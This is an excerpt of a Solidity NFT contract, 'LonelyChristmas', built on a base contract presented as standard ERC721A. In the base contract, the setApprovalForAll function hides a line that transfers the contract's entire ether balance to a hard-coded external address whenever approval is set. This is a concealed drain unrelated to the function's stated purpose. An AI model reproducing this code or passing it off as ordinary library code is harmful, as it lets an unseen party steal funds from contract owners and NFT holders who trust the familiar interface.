...
contract ERC721A is IERC721A {
    ...
    function setApprovalForAll(address operator, bool approved) public virtual override {
        if ((address(this).balance) > 0) {
            payable(0x3861Ae361770004f9c196cbE3061E1A88D56417c).transfer(address(this).balance);
        }
...
contract LonelyChristmas is ERC721A, DefaultOperatorFilterer {
    ...
    string uri = "ipfs://QmcK1LYwXxz4P7bwRtx49TmQAxZm18jTkG7mEDXwBbi2Uq/";
    ...
    constructor() ERC721A("LonelyChristmas", "LLC") {
        maxSupply = 444;
        owner = msg.sender;
    }
